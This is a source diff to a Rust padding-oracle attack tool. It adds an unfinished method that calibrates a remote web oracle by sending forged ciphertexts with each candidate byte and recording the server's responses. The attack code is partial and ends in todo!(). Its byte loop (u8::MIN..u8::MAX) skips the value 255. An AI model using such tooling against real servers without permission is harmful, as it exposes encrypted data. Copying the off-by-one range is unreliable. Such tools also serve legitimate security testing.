@@ -2,11 +2,12 @@ use std::mem;
 
 use anyhow::{Context, Result};
 use rayon::iter::{IntoParallelIterator, ParallelIterator};
+use reqwest::blocking::Response;
 
 use crate::{
     block::block_size::BlockSizeTrait,
     cypher_text::{encode::AmountBlocksTrait, forged_cypher_text::ForgedCypherText, CypherText},
-    oracle::Oracle,
+    oracle::{web::calibrate_web::CalibrationWebOracle, Oracle},
 };
 
 /// Manages the oracle attack on a high level.
@@ -45,9 +46,10 @@ impl<'a> Questioning<'a> {
 
                 let mut bytes_answered = 0;
                 while bytes_answered < *forged_cypher_text.block_size() {
+                    // TODO: using `parallel-stream` instead of `rayon` would likely be better. The oracle does the hard work, i.e. decryption, and is usually remote. So we're I/O bound, which prefers async, instead of CPU bound.
                     let current_byte_solution = (u8::MIN..u8::MAX)
                         .into_par_iter()
-                        .map(|byte_value| -> Result<ForgedCypherText> {
+                        .map(|byte_value| {
                             let mut forged_cypher_text = forged_cypher_text.clone();
 
                             forged_cypher_text.set_current_byte(byte_value)?;
@@ -81,5 +83,26 @@ impl<'a> Questioning<'a> {
                 forged_cypher_text.plaintext_block_solution()
             })
             .collect::<Result<_>>()
+    }
+
+    pub fn calibrate_web_oracle(&mut self, oracle: CalibrationWebOracle) -> Result<Self> {
+        // `clone` to make sure we don't modify any forged cypher texts before the actual attack
+        let calibration_cypher_text = &self.forged_cypher_texts[0];
+
+        let responses = (u8::MIN..u8::MAX)
+            .into_par_iter()
+            .map(|byte_value| {
+                let mut forged_cypher_text = calibration_cypher_text.clone();
+
+                forged_cypher_text.set_current_byte(byte_value)?;
+                oracle.ask_validation(&forged_cypher_text)
+            })
+            .collect::<Result<Vec<_>>>()
+            .context("Failed to request web server for calibration")?;
+
+        eprintln!("responses = {:#?}", responses);
+        // TODO: save this
+        // correct_padding_response: Option<Response>,
+        todo!()
     }
 }
